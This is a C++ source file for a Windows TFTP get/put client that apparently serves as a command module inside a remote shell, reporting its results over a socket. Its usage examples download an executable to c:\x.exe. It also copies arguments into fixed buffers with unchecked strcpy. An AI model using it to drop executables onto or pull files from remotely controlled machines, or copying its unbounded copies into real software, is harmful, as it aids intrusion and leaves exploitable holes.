// Author: LZX
// E-mail: LZX@qq.com
// Version: V1.0
// Purpose: A tftp client supports get && put commands,and only transfers data in octet mode.
// Test PlatForm: WinXP SP2
// Compiled On: VC++ 6.0 

#include<stdlib.h>
#include<iostream>
#include<conio.h>
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include <errno.h>
#pragma comment(lib,"ws2_32.lib")
#define BUFSIZE 516
/*
          opcode  operation
            1     Read request (RRQ)
            2     Write request (WRQ)
            3     Data (DATA)
            4     Acknowledgment (ACK)
            5     Error (ERROR)
*/
#define RRQ		0x01
#define WRQ		0x02
#define DATA	0x03
#define ACK		0x04
#define ERROR	0x05

struct TFTPReq{
	BYTE x;
	BYTE CMD;
	char FileName[256];
};
struct TFTPHead{
	BYTE x;
	BYTE REP;
	WORD N;
	BYTE pData;
};

/////
/////

int ZXTFtp(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	if(argc!=6)
	{
		SendMessage(Socket, "A tftp client supports get && put commands.\r\n");
		SendMessage(Socket, "Usage:\r\n    %s IP port [-g|-p] source destination\r\n",argv[0]);
		SendMessage(Socket, "    %s x.x.x.x 69 -g x.exe c:\\x.exe\r\n",argv[0]);
		SendMessage(Socket, "    %s x.x.x.x 69 -p c:\\x.exe x.exe\r\n",argv[0]);
		return 0;
	}
	WSADATA  wsadata;
	WORD     version;
	version = MAKEWORD(2,2);
    if(WSAStartup( version , &wsadata )!= 0)
	   return 0;
	struct sockaddr_in 	LocalTFTP,ServerTFTPD,SourceAddr;
	struct sockaddr_in  in;
	memset(&in,0,sizeof(sockaddr_in));
	int AddrLength=sizeof(sockaddr_in);
	UINT TimeOut = 5000;

	SOCKET Locals = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	LocalTFTP.sin_family=AF_INET;
	LocalTFTP.sin_addr.s_addr= INADDR_ANY;
	LocalTFTP.sin_port=INADDR_ANY;
	
	setsockopt(Locals,SOL_SOCKET,SO_RCVTIMEO,(char *)&TimeOut,sizeof(TimeOut));
	SOCKET Servers = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	ServerTFTPD.sin_family=AF_INET;
	ServerTFTPD.sin_addr.s_addr= inet_addr(argv[1]);
	ServerTFTPD.sin_port=htons(atoi(argv[2]));

	//tftp.exe IP port [-g|-p] source destination
	char source[MAX_PATH],destination[MAX_PATH];
	strcpy(source,argv[4]);
	strcpy(destination,argv[5]);
	if((argv[3][1]!='p')&&(argv[3][1]!='g'))
		return 0;

	DWORD dwStartTime = GetTickCount(), dwElapseTime;
////////////////////////////////
	FILE *rfp=NULL,*wfp=NULL;
	int Filesize=0,idx=0,len,readbytes=0,writebytes=0,nBytesLeft;
	WORD nPacket=0;
	char Buffer[BUFSIZE];
	ZeroMemory(Buffer,BUFSIZE);
	int DataLen=0;
	TFTPReq *tftpreq=(TFTPReq *)Buffer;
	if(argv[3][1]=='p')
	{
		rfp=fopen(source,"rb");
		if(rfp==NULL)
		{
			SendMessage(Socket, "open file:%s error.\r\n",source);
			return 0;
		}
		fseek(rfp, 0, SEEK_END);
		Filesize=ftell(rfp);
		if(Filesize < 0) return -1;
		if(Filesize == 0) return 0;
		nBytesLeft=Filesize;
		fseek(rfp, 0, SEEK_SET);

		tftpreq->CMD=WRQ;  //GET==0x01   PUT==0x02 //octet
		strcpy(tftpreq->FileName,destination);
		memcpy(tftpreq->FileName+strlen(destination)+1,"octet",5);
		DataLen=sendto(Locals,Buffer,strlen(destination)+9,0,(SOCKADDR *)&ServerTFTPD,sizeof(ServerTFTPD));
		if(DataLen==SOCKET_ERROR)
			return 0;
		while(1)
		{
			DataLen=recvfrom(Locals,Buffer,BUFSIZE,0,(SOCKADDR *)&SourceAddr,(int FAR *)&AddrLength);
			if((DataLen==SOCKET_ERROR)||(DataLen==0))
			{
				SendMessage(Socket, "Connection has been closed.\r\n");
				break;
			}
			//printf("IP: %s:%d\n",inet_ntoa(SourceAddr.sin_addr),ntohs(SourceAddr.sin_port));
			TFTPHead *tftphead=(TFTPHead *)Buffer;

			if(tftphead->REP!=ACK || ntohs(tftphead->N)!=nPacket)
			{
				if(tftphead->REP==ERROR)
				SendMessage(Socket, "Error on server : %s",&tftphead->pData);
				break;
			}
			if(nBytesLeft<BUFSIZE-4)
				len=nBytesLeft;
			else
				len=BUFSIZE-4;
			tftphead->REP=DATA;
			nPacket++;
			tftphead->N=htons(nPacket);
			readbytes=fread(&tftphead->pData, 1, len, rfp);
			if(readbytes!=len)
				break;
			if(sendto(Locals,Buffer,readbytes+4,0,(SOCKADDR *)&SourceAddr,sizeof(ServerTFTPD))==SOCKET_ERROR)
				break;
			idx+=readbytes;
			nBytesLeft-=readbytes;
			if((readbytes<512))
				break;
		}
		if(idx==Filesize)
			SendMessage(Socket, "\Transfer successful: %d bytes in %d millisecond.\r\n",idx, GetTickCount()-dwStartTime);
		else
			SendMessage(Socket, "\r\nTransfer Error.\r\n");
		fclose(rfp);
		closesocket(Locals);

	}else if(argv[3][1]=='g')
	{
		wfp=fopen(destination,"wb");
		if(wfp==NULL)
		{
			SendMessage(Socket, "open file:%s error.\r\n",destination);
			return 0;
		}
		tftpreq->CMD=RRQ;
		strcpy(tftpreq->FileName,source);
		memcpy(tftpreq->FileName+strlen(source)+1,"octet",5);	

		DataLen=sendto(Locals,Buffer,strlen(source)+9,0,(SOCKADDR *)&ServerTFTPD,sizeof(ServerTFTPD));
		if(DataLen==SOCKET_ERROR)
			return 0;

		int recvbytes=0;

		while(1)
		{

				DataLen=recvfrom(Locals,Buffer,BUFSIZE,0,(SOCKADDR *)&SourceAddr,(int FAR *)&AddrLength);
				if((DataLen==SOCKET_ERROR)||(DataLen==0))
				{
					SendMessage(Socket, "Connection has been closed.\r\n");
					break;
				}
				//printf("IP: %s:%d\n",inet_ntoa(SourceAddr.sin_addr),ntohs(SourceAddr.sin_port));
				TFTPHead *tftphead=(TFTPHead *)Buffer;
				if(tftphead->REP==ERROR)
				{
					SendMessage(Socket, "Error on server : %s",&tftphead->pData);
					break;
				}
				//printf("%s",&tftphead->pData);
				recvbytes+=fwrite(&tftphead->pData,1,DataLen-4,wfp);

				tftphead->REP=ACK;
				if(sendto(Locals,Buffer,4,0,(SOCKADDR *)&SourceAddr,AddrLength)==SOCKET_ERROR)
				{
					SendMessage(Socket, "sendto error\r\n");
					break;
				}
				if(DataLen<516)
					break;
		}
		SendMessage(Socket, "\Transfer successful: %d bytes in %d millisecond.\r\n",recvbytes, GetTickCount()-dwStartTime);
		fclose(wfp);
		closesocket(Locals);
	}

	return 0;

}
